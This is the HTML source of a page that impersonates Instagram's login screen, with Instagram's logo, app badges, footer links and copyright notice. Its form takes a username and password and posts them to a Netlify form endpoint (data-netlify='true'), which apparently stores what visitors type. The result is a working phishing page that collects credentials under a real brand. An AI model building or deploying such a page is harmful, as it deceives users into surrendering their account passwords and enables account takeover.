<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
    <link rel="stylesheet" href="style.css">
    <title>Instagram Login Form</title>
</head>

<body>

    <div id="wrapper">
        <div class="container">
            <div class="phone-app-demo"></div>
            <div class="form-data">
                <form name="instagram" action="/" method="POST" data-netlify="true">
                    <div class="logo">
                        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
                            alt="logo">
                    </div>
                    <input type="text" autocomplete="username" placeholder="Phone number, username, or email" name="username">
                    <input type="password" autocomplete="current-password" placeholder="Password" name="password">
                    <button class="form-btn" type="submit">Log in</button>
                    <span class="has-separator">Or</span>
                    <a class="facebook-login" href="#">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </a>
                    <a class="password-reset" href="#">Forgot password?</a>
                </form>
                <div class="sign-up">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
                <div class="get-the-app">
                    <span>Get the app.</span>
                    <!-- <div class="badges">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                            alt="app-store badge">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                            alt="google-play badge">
                    </div> -->
                    <div class="badges">
                        <a aria-label="Download on the App Store"
                            href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo"
                            tabindex="0"><img alt="Download on the App Store"
                                src="https:www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png">
                        </a>
                        <a aria-label="Get it on Google Play"
                            href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D219569F8-97FD-46A1-8F3D-8685B2402C0C%26utm_content%3Dlo%26utm_medium%3Dbadge"
                            tabindex="0">
                            <img alt="Get it on Google Play"
                                src="https:www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png">
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <footer>
            <div class="container">
                <nav class="footer-nav">
                    <ul>
                        <li>
                            <a href="#">About us</a>
                        </li>
                        <li>
                            <a href="#">Support</a>
                        </li>
                        <li>
                            <a href="#">Press</a>
                        </li>
                        <li>
                            <a href="#">Api</a>
                        </li>
                        <li>
                            <a href="#">Jobs</a>
                        </li>
                        <li>
                            <a href="#">Privacy</a>
                        </li>
                        <li>
                            <a href="#">Terms</a>
                        </li>
                        <li>
                            <a href="#">Directory</a>
                        </li>
                        <li>
                            <a href="#">Profiles</a>
                        </li>
                        <li>
                            <a href="#">Hashtags</a>
                        </li>
                        <li>
                            <a href="#">Languages</a>
                        </li>
                    </ul>
                </nav>
                <div class="copyright-notice">
                    &copy 2019 Instagram
                </div>
            </div>
        </footer>

    </div>

</body>

</html>
